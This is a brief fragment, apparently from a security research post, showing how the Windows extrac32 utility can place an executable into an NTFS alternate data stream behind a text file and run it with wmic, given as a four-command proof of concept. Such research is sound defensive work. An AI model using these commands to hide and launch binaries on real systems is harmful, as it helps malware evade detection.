Basically what you use it for is to extract cab files. What I figured out was that you also can use this command to add alternate data streams. The PoC for doing this (including creating a CAB) looks like this:<br/>
<br/>
echo "empty file" &gt; c:\ADS\file.txt<br/>
makecab c:\ADS\procexp.exe c:\ADS\procexp.cab<br/>
extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe<br/>
wmic process call create '"c:\ADS\file.txt:procexp.exe"'</body></html>
